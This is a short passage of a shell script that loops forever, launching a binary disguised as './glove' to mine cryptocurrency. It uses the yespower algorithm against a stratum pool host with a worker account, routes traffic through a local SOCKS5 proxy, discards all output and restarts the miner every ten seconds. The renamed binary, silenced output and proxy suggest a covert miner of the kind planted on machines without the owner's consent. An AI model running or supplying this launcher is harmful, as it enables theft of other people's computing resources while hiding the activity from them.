...
while true
do
./glove --algo yespower -o stratum+tcp://aikawork.teatspray.fun:3933 -u jimmymartindale80.Rise -p IhatePopUpsWut,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
sleep 10
done
